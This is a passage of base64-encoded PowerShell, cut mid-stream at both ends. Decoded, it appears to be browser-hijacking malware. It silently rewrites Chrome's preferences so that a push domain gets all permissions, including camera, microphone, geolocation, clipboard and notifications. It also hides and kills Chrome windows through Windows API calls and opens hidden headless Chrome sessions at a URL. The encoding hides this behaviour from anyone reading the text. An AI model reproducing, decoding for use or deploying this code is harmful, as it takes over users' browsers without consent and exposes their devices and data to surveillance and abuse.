ZGVmYXVsdF9jb250ZW50X3NldHRpbmdfdmFsdWVzKSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIGRlZmF1bHRfY29udGVudF9zZXR0aW5nX3ZhbHVlcyAtVmFsdWUgQHt9DQogICAgfQ0KDQogICAgaWYgKC1ub3QgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmRlZmF1bHRfY29udGVudF9zZXR0aW5nX3ZhbHVlcy5wb3B1cHMpIHsNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmRlZmF1bHRfY29udGVudF9zZXR0aW5nX3ZhbHVlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIHBvcHVwcyAtVmFsdWUgMQ0KICAgIH0gZWxzZSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5kZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMucG9wdXBzID0gMQ0KICAgIH0NCg0KICAgIGlmICgtbm90ICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5kZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMuc3VicmVzb3VyY2VfZmlsdGVyKSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5kZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBzdWJyZXNvdXJjZV9maWx0ZXIgLVZhbHVlIDENCiAgICB9IGVsc2Ugew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuZGVmYXVsdF9jb250ZW50X3NldHRpbmdfdmFsdWVzLnN1YnJlc291cmNlX2ZpbHRlciA9IDENCiAgICB9DQoNCiAgICAkcHJlZmVyZW5jZXNDb250ZW50SnNvbiA9ICRwcmVmZXJlbmNlc0NvbnRlbnQgfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggMzINCiAgICBTZXQtQ29udGVudCAtUGF0aCAkY2hyb21lUHJlZmVyZW5jZXNQYXRoIC1WYWx1ZSAkcHJlZmVyZW5jZXNDb250ZW50SnNvbiAtRm9yY2UNCg0KICAgICRwcmVmZXJlbmNlc1BhdGggPSAiJGVudjpMT0NBTEFQUERBVEFcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxQcmVmZXJlbmNlcyINCg0KICAgIGlmIChUZXN0LVBhdGggJHByZWZlcmVuY2VzUGF0aCkgew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJHByZWZlcmVuY2VzUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbg0KICAgICAgICAkY29udGVudFNldHRpbmdzID0gJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmNvbnRlbnRfc2V0dGluZ3MuZXhjZXB0aW9ucw0KICAgICAgICAkc2V0dGluZ3NUb1VwZGF0ZSA9IEAoDQogICAgICAgICAgICAiYXV0b19waWN0dXJlX2luX3BpY3R1cmUiLCAiYmFja2dyb3VuZF9zeW5jIiwgImNhbWVyYSIsICJjbGlwYm9hcmQiLCAiY29va2llcyIsIA0KICAgICAgICAgICAgImdlb2xvY2F0aW9uIiwgImltYWdlcyIsICJqYXZhc2NyaXB0IiwgIm1pY3JvcGhvbmUiLCAibWlkaV9zeXNleCIsIA0KICAgICAgICAgICAgIm5vdGlmaWNhdGlvbnMiLCAicG9wdXBzIiwgInBsdWdpbnMiLCAic291bmQiLCAidW5zYW5kYm94ZWRfcGx1Z2lucyIsIA0KICAgICAgICAgICAgImF1dG9tYXRpY19kb3dubG9hZHMiLCAiZmxhc2hfZGF0YSIsICJtaXhlZF9zY3JpcHQiLCAic2Vuc29ycyIsIndpbmRvd19wbGFjZW1lbnQiLCJ3ZWJpZF9hcGkiLCJ2ciIsDQogICAgICAgICAgICAic3VicmVzb3VyY2VfZmlsdGVyIiwibWVkaWFfc3RyZWFtX21pYyIsIm1lZGlhX3N0cmVhbV9taWMiLCJtZWRpYV9zdHJlYW1fY2FtZXJhIiwibG9jYWxfZm9udHMiLA0KICAgICAgICAgICAgImphdmFzY3JpcHRfaml0IiwiaWRsZV9kZXRlY3Rpb24iLCJjYXB0dXJlZF9zdXJmYWNlX2NvbnRyb2wiLCJhciINCg0KICAgICAgICApDQoNCiAgICAgICAgZm9yZWFjaCAoJHNldHRpbmcgaW4gJHNldHRpbmdzVG9VcGRhdGUpIHsNCiAgICAgICAgICAgIGlmICgkbnVsbCAtZXEgJGNvbnRlbnRTZXR0aW5ncy4kc2V0dGluZykgew0KICAgICAgICAgICAgICAgICRjb250ZW50U2V0dGluZ3MgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAkc2V0dGluZyAtVmFsdWUgQHt9DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkc3BlY2lmaWNTZXR0aW5nID0gJGNvbnRlbnRTZXR0aW5ncy4kc2V0dGluZw0KICAgICAgICAgICAgaWYgKCRzcGVjaWZpY1NldHRpbmcuUFNPYmplY3QuUHJvcGVydGllcy5OYW1lIC1jb250YWlucyAkcHVzaERvbWFpbikgeyAgICAgICAgICAgIA0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAkc3BlY2lmaWNTZXR0aW5nIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJHB1c2hEb21haW4gLVZhbHVlIEB7DQogICAgICAgICAgICAgICAgICAgICJsYXN0X21vZGlmaWVkIiA9ICIxMzM2MjcyMDU0NTc4NTc3NCINCiAgICAgICAgICAgICAgICAgICAgInNldHRpbmciID0gMQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkY29udGVudFNldHRpbmdzLiRzZXR0aW5nID0gJHNwZWNpZmljU2V0dGluZw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmNvbnRlbnRfc2V0dGluZ3MuZXhjZXB0aW9ucyA9ICRjb250ZW50U2V0dGluZ3MNCiAgICAgICAgJHVwZGF0ZWRQcmVmZXJlbmNlc0pzb24gPSAkcHJlZmVyZW5jZXNDb250ZW50IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDEwDQogICAgICAgICR1cGRhdGVkUHJlZmVyZW5jZXNKc29uIHwgU2V0LUNvbnRlbnQgLVBhdGggJHByZWZlcmVuY2VzUGF0aCAtRW5jb2RpbmcgVVRGOA0KDQogICAgICAgIHdyaXRlZGJnICJOb3RpZmljYXRpb24gc3Vic2NyaXB0aW9uIGZvciAkcHVzaERvbWFpbiBhZGRlZCBzdWNjZXNzZnVsbHkgd2l0aCBhbGwgcGVybWlzc2lvbnMuIg0KICAgIH0gZWxzZSB7DQogICAgICAgIHdyaXRlZGJnICJQcmVmZXJlbmNlcyBmaWxlIG5vdCBmb3VuZCBhdCBwYXRoOiAkcHJlZmVyZW5jZXNQYXRoIg0KICAgIH0NCn0NCg0KDQoNCmZ1bmN0aW9uIENsb3NlLUNocm9tZVdpbmRvdyB7DQogICAgcGFyYW0gKCR3aW5kb3cpDQogICAgW1VzZXIzMlhdOjpDbG9zZVdpbmRvdygkd2luZG93KSB8IE91dC1OdWxsDQogICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyAyNQ0KfQ0KDQpmdW5jdGlvbiBDbG9zZS1DaHJvbWUgew0KICAgIHBhcmFtICgkcHJvY2VzcykNCiAgICBDbG9zZS1DaHJvbWVXaW5kb3cgLXdpbmRvdyAkcHJvY2Vzcy5NYWluV2luZG93SGFuZGxlDQogICAgdHJ5IHsNCiAgICAgICAgJHByb2Nlc3MuQ2xvc2UoKQ0KICAgIH0NCiAgICBjYXRjaCB7DQogIA0KICAgIH0NCn0NCg0KDQpmdW5jdGlvbiBDbG9zZS1BbGxDaHJvbWVzIHsNCiAgICAkd2luZG93cyA9IFtVc2VyMzJYXTo6RW51bWVyYXRlQWxsV2luZG93cygpDQogICAgZm9yZWFjaCAoJHdpbmRvdyBpbiAkd2luZG93cykgDQogICAgew0KICAgICAgICAkdGl0bGUgPSBbVXNlcjMyWF06OkdldFdpbmRvd1RleHQoJHdpbmRvdykNCiAgICAgICAgaWYgKCR0aXRsZS5Db250YWlucygiR29vZ2xlIENocm9tZSIpKQ0KICAgICAgICB7DQogICAgICAgICAgICBbVXNlcjMyWF06OlNob3dXaW5kb3coJHdpbmRvdywgW1VzZXIzMlhdOjpTV19ISURFKSB8IE91dC1OdWxsDQogICAgICAgICAgICBDbG9zZS1DaHJvbWVXaW5kb3cgLXdpbmRvdyAkd2luZG93DQogICAgICAgIH0NCiAgICB9DQogICAgQ2xvc2UtUHJvY2Vzc2VzKEAoJ2Nocm9tZS5leGUnKSkNCiAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDUNCn0NCg0KZnVuY3Rpb24gQ29uZmlndXJlQ2hyb21lUHVzaGVzIHsNCiAgICAkYXV0byA9IFRlc3QtQXV0b3N0YXJ0Ow0KICAgIGlmICgkc2VydmVyLnB1c2hlc0ZvcmNlIC1uZSAkZmFsc2UgLWFuZCAkYXV0byAtZXEgJHRydWUpDQogICAgew0KICAgICAgICB3cml0ZWRiZyAiU2tpcHBpbmcgQ29uZmlndXJlQ2hyb21lUHVzaGVzIg0KICAgICAgICByZXR1cm4NCiAgICB9DQogICAgdHJ5IHsNCiAgICAgICAgDQogICANCg0KICAgIEFkZC1UeXBlIEAiDQogICAgdXNpbmcgU3lzdGVtOw0KICAgIHVzaW5nIFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljOw0KICAgIHVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsNCiAgICB1c2luZyBTeXN0ZW0uVGV4dDsNCg0KICAgIHB1YmxpYyBzdGF0aWMgY2xhc3MgVXNlcjMyWCB7DQogICAgICAgIHB1YmxpYyBkZWxlZ2F0ZSBib29sIEVudW1XaW5kb3dzUHJvYyhJbnRQdHIgaFduZCwgSW50UHRyIGxQYXJhbSk7DQoNCiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBFbnVtV2luZG93cyhFbnVtV2luZG93c1Byb2MgbHBFbnVtRnVuYywgSW50UHRyIGxQYXJhbSk7DQoNCiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IEdldFdpbmRvd1RleHQoSW50UHRyIGhXbmQsIFN0cmluZ0J1aWxkZXIgbHBTdHJpbmcsIGludCBuTWF4Q291bnQpOw0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBHZXRXaW5kb3dUZXh0TGVuZ3RoKEludFB0ciBoV25kKTsNCg0KICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIElzV2luZG93VmlzaWJsZShJbnRQdHIgaFduZCk7DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0V2luZG93VGV4dChJbnRQdHIgaFduZCkgew0KICAgICAgICAgICAgaW50IGxlbmd0aCA9IEdldFdpbmRvd1RleHRMZW5ndGgoaFduZCk7DQogICAgICAgICAgICBpZiAobGVuZ3RoID09IDApIHJldHVybiBTdHJpbmcuRW1wdHk7DQoNCiAgICAgICAgICAgIFN0cmluZ0J1aWxkZXIgc2IgPSBuZXcgU3RyaW5nQnVpbGRlcihsZW5ndGggKyAxKTsNCiAgICAgICAgICAgIEdldFdpbmRvd1RleHQoaFduZCwgc2IsIHNiLkNhcGFjaXR5KTsNCiAgICAgICAgICAgIHJldHVybiBzYi5Ub1N0cmluZygpOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIElzV2luZG93VmlzaWJsZUV4KEludFB0ciBoV25kKSB7DQogICAgICAgICAgICByZXR1cm4gSXNXaW5kb3dWaXNpYmxlKGhXbmQpICYmIEdldFdpbmRvd1RleHRMZW5ndGgoaFduZCkgPiAwOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBJbnRQdHJbXSBFbnVtZXJhdGVBbGxXaW5kb3dzKCkgew0KICAgICAgICAgICAgdmFyIHdpbmRvd0hhbmRsZXMgPSBuZXcgTGlzdDxJbnRQdHI+KCk7DQogICAgICAgICAgICBFbnVtV2luZG93cygoaFduZCwgbFBhcmFtKSA9PiB7DQogICAgICAgICAgICAgICAgaWYgKElzV2luZG93VmlzaWJsZUV4KGhXbmQpKSB7DQogICAgICAgICAgICAgICAgICAgIHdpbmRvd0hhbmRsZXMuQWRkKGhXbmQpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0sIEludFB0ci5aZXJvKTsNCiAgICAgICAgICAgIHJldHVybiB3aW5kb3dIYW5kbGVzLlRvQXJyYXkoKTsNCiAgICAgICAgfQ0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBTaG93V2luZG93KEludFB0ciBoV25kLCBpbnQgbkNtZFNob3cpOw0KDQogICAgICAgIHB1YmxpYyBjb25zdCBpbnQgU1dfSElERSA9IDA7DQogICAgICAgIHB1YmxpYyBjb25zdCBpbnQgU1dfTUlOSU1JWkUgPSA2Ow0KICAgICAgICBwdWJsaWMgY29uc3QgaW50IFNXX1NIT1cgPSA1Ow0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBQb3N0TWVzc2FnZShJbnRQdHIgaFduZCwgdWludCBNc2csIEludFB0ciB3UGFyYW0sIEludFB0ciBsUGFyYW0pOw0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBDbG9zZVdpbmRvdyhJbnRQdHIgaFduZCkgew0KICAgICAgICAgICAgY29uc3QgdWludCBXTV9DTE9TRSA9IDB4MDAxMDsNCiAgICAgICAgICAgIFBvc3RNZXNzYWdlKGhXbmQsIFdNX0NMT1NFLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8pOw0KICAgICAgICB9DQogICAgfQ0KIkANCg0KICAgIGlmIChIYXZlVG9QdXNoZXMpDQogICAgew0KICAgICAgICBDbG9zZS1BbGxDaHJvbWVzOw0KICAgICAgICBSZW1vdmUtUHVzaGVzOw0KICAgICAgICBBZGQtUHVzaGVzOw0KICAgIH0NCg0KfQ0KY2F0Y2ggew0KICAgIHdyaXRlZGJnICJBbiBlcnJvciBvY2N1cnJlZCAoQ29uZmlndXJlIENocm9tZSBQdXNoZXMpOiAkXyINCn0NCn0NCg0KDQoNCmZ1bmN0aW9uIE9wZW4tQ2hyb21lV2l0aFVybCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSR1cmwsICRpc0RlYnVnDQogICAgKQ0KICAgICRqb2IgPSBTdGFydC1Kb2IgLVNjcmlwdEJsb2NrIHsNCiAgICAgICAgICAgIHBhcmFtICgkdXJsLCAkaXNEZWJ1ZykNCg0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICANCiANCiAgICAgICAgICAgIEFkZC1UeXBlIEAiDQogICAgICAgICAgICB1c2luZyBTeXN0ZW07DQogICAgICAgICAgICB1c2luZyBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYzsNCiAgICAgICAgICAgIHVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsNCiAgICAgICAgICAgIHVzaW5nIFN5c3RlbS5UZXh0Ow0KICAgICAgICAgICAgDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIGNsYXNzIFVzZXIzMlggew0KICAgICAgICAgICAgICAgIHB1YmxpYyBkZWxlZ2F0ZSBib29sIEVudW1XaW5kb3dzUHJvYyhJbnRQdHIgaFduZCwgSW50UHRyIGxQYXJhbSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgICAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgRW51bVdpbmRvd3MoRW51bVdpbmRvd3NQcm9jIGxwRW51bUZ1bmMsIEludFB0ciBsUGFyYW0pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICAgICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgR2V0V2luZG93VGV4dChJbnRQdHIgaFduZCwgU3RyaW5nQnVpbGRlciBscFN0cmluZywgaW50IG5NYXhDb3VudCk7DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgICAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBHZXRXaW5kb3dUZXh0TGVuZ3RoKEludFB0ciBoV25kKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBJc1dpbmRvd1Zpc2libGUoSW50UHRyIGhXbmQpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0V2luZG93VGV4dChJbnRQdHIgaFduZCkgew0KICAgICAgICAgICAgICAgICAgICBpbnQgbGVuZ3RoID0gR2V0V2luZG93VGV4dExlbmd0aChoV25kKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGxlbmd0aCA9PSAwKSByZXR1cm4gU3RyaW5nLkVtcHR5Ow0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIFN0cmluZ0J1aWxkZXIgc2IgPSBuZXcgU3RyaW5nQnVpbGRlcihsZW5ndGggKyAxKTsNCiAgICAgICAgICAgICAgICAgICAgR2V0V2luZG93VGV4dChoV25kLCBzYiwgc2IuQ2FwYWNpdHkpOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gc2IuVG9TdHJpbmcoKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgSXNXaW5kb3dWaXNpYmxlRXgoSW50UHRyIGhXbmQpIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIElzV2luZG93VmlzaWJsZShoV25kKSAmJiBHZXRXaW5kb3dUZXh0TGVuZ3RoKGhXbmQpID4gMDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBwdWJsaWMgc3RhdGljIEludFB0cltdIEVudW1lcmF0ZUFsbFdpbmRvd3MoKSB7DQogICAgICAgICAgICAgICAgICAgIHZhciB3aW5kb3dIYW5kbGVzID0gbmV3IExpc3Q8SW50UHRyPigpOw0KICAgICAgICAgICAgICAgICAgICBFbnVtV2luZG93cygoaFduZCwgbFBhcmFtKSA9PiB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSXNXaW5kb3dWaXNpYmxlRXgoaFduZCkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aW5kb3dIYW5kbGVzLkFkZChoV25kKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgICAgICAgICB9LCBJbnRQdHIuWmVybyk7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiB3aW5kb3dIYW5kbGVzLlRvQXJyYXkoKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgICAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBTaG93V2luZG93KEludFB0ciBoV25kLCBpbnQgbkNtZFNob3cpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgcHVibGljIGNvbnN0IGludCBTV19ISURFID0gMDsNCiAgICAgICAgICAgICAgICBwdWJsaWMgY29uc3QgaW50IFNXX01JTklNSVpFID0gNjsNCiAgICAgICAgICAgICAgICBwdWJsaWMgY29uc3QgaW50IFNXX1NIT1cgPSA1Ow0KICAgICAgICAgICAgICAgIHB1YmxpYyBjb25zdCBpbnQgU1dfTUFYSU1JWkUgPSAzOyAvLyBBZGRlZCBjb25zdGFudCBmb3IgbWF4aW1pemluZyB3aW5kb3cNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFBvc3RNZXNzYWdlKEludFB0ciBoV25kLCB1aW50IE1zZywgSW50UHRyIHdQYXJhbSwgSW50UHRyIGxQYXJhbSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBwdWJsaWMgc3RhdGljIHZvaWQgQ2xvc2VXaW5kb3coSW50UHRyIGhXbmQpIHsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgdWludCBXTV9DTE9TRSA9IDB4MDAxMDsNCiAgICAgICAgICAgICAgICAgICAgUG9zdE1lc3NhZ2UoaFduZCwgV01fQ0xPU0UsIEludFB0ci5aZXJvLCBJbnRQdHIuWmVybyk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KIkANCn0NCmNhdGNoIHsNCn0NCiAgICAgICAgDQogICAgICAgIGZ1bmN0aW9uIENsb3NlLUNocm9tZVdpbmRvdyB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgIHBhcmFtICgkd2luZG93KQ0KICAgICAgICAgICAgICAgIFtVc2VyMzJYXTo6Q2xvc2VXaW5kb3coJHdpbmRvdykgfCBPdXQtTnVsbA0KICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgMTAwDQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaCB7fQ0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBmdW5jdGlvbiBDbG9zZS1DaHJvbWUgew0KICAgICAgICAgICAgcGFyYW0gKCRwcm9jZXNzKQ0KICAgICAgICAgICAgQ2xvc2UtQ2hyb21lV2luZG93IC13aW5kb3cgJHByb2Nlc3MuTWFpbldpbmRvd0hhbmRsZQ0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAkcHJvY2VzcyB8IFN0b3AtUHJvY2VzcyAtRm9yY2UNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoIHsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgICRjaHJvbWVQYXRocyA9IEAoDQogICAgICAgICAgICAiQzpcUHJvZ3JhbSBGaWxlc1xHb29nbGVcQ2hyb21lXEFwcGxpY2F0aW9uXGNocm9tZS5leGUiLA0KICAgICAgICAgICAgIkM6XFByb2dyYW0gRmlsZXMgKHg4NilcR29vZ2xlXENocm9tZVxBcHBsaWNhdGlvblxjaHJvbWUuZXhlIiwNCiAgICAgICAgICAgICIkZW52OkxPQ0FMQVBQREFUQVxHb29nbGVcQ2hyb21lXEFwcGxpY2F0aW9uXGNocm9tZS5leGUiLA0KICAgICAgICAgICAgIiRlbnY6UHJvZ3JhbUZpbGVzXEdvb2dsZVxDaHJvbWVcQXBwbGljYXRpb25cY2hyb21lLmV4ZSIsDQogICAgICAgICAgICAiJGVudjpQcm9ncmFtRmlsZXMoeDg2KVxHb29nbGVcQ2hyb21lXEFwcGxpY2F0aW9uXGNocm9tZS5leGUiDQogICAgICAgICkNCiAgICAgICAgJHJlc29sdmVkUGF0aHMgPSBAKCkNCiAgICAgICAgZm9yZWFjaCAoJHBhdGggaW4gJGNocm9tZVBhdGhzKSB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgICRyZXNvbHZlZFBhdGggPSBSZXNvbHZlLVBhdGggLVBhdGggJHBhdGggLUVycm9yQWN0aW9uIFN0b3ANCiAgICAgICAgICAgICAgICBpZiAoJHJlc29sdmVkUGF0aCAtbm90aW4gJHJlc29sdmVkUGF0aHMpIHsNCiAgICAgICAgICAgICAgICAgICAgJHJlc29sdmVkUGF0aHMgKz0gJHJlc29sdmVkUGF0aC5QYXRoDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICAgICAgd3JpdGVkYmcgIkVycm9yIHJlc29sdmluZyBwYXRoOiAkXyINCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICAkcmVzb2x2ZWRQYXRocyA9ICRyZXNvbHZlZFBhdGhzIHwgU2VsZWN0LU9iamVjdCAtVW5pcXVlDQogICAgICAgIGZvcmVhY2ggKCRwYXRoIGluICRyZXNvbHZlZFBhdGhzKSB7DQogICAgICAgICAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRwYXRoKSB7DQogICAgICAgICAgICAgICAgd3JpdGVkYmcgIkZvdW5kIENocm9tZSBhdDogJHBhdGgiDQogICAgDQogICAgICAgICAgICAgICAgJHByb2Nlc3NTdGFydEluZm8gPSBOZXctT2JqZWN0IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvDQogICAgICAgICAgICAgICAgJHByb2Nlc3NTdGFydEluZm8uRmlsZU5hbWUgPSAkcGF0aA0KICAgICAgICAgICAgICAgIGlmICgtbm90ICRpc0RlYnVnKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgJHByb2Nlc3NTdGFydEluZm8uQXJndW1lbnRzID0gIi0taGVhZGxlc3MiOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkcHJvY2Vzc1N0YXJ0SW5mby5Bcmd1bWVudHMgKz0gIiAtLWRpc2FibGUtZ3B1IC0tZHVtcC1kb20gJHVybCINCiAgICAgICAgICAgICAgICAkcHJvY2Vzc1N0YXJ0SW5mby5DcmVhdGVOb1dpbmRvdyA9ICRmYWxzZQ0KICAgICAgICAgICAgICAgICRwcm9jZXNzU3RhcnRJbmZvLlVzZVNoZWxsRXhlY3V0ZSA9ICRmYWxzZQ0KICAgICAgICAgICAgICAgICRwcm9jZXNzID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzcw0KICAgICAgICAgICAgICAgICRwcm9jZXNzLlN0YXJ0SW5mbyA9ICRwcm9jZXNzU3RhcnRJbmZvDQogICAgICAgICAgICAgICAgJHByb2Nlc3MuU3RhcnQoKSB8IE91dC1OdWxsICAgICAgICAgDQogICAgICAgICAgICAgICAgJGVuZFRpbWUgPSAoR2V0LURhdGUpLkFkZFNlY29uZHMoOCkNCiAgICAgICAgICAgICAgICB3aGlsZSAoKEdldC1EYXRlKSAtbHQgJGVuZFRpbWUpIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRpc0RlYnVnIC1lcSAkZmFsc2UpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtVc2VyMzJYXTo6U2hvd1dpbmRvdygkcHJvY2Vzcy5NYWluV2luZG93SGFuZGxlLCBbVXNlcjMyWF06OlNXX0hJREUpIHwgT3V0LU51bGwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDEwMA0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB0cnkNCiAgICAg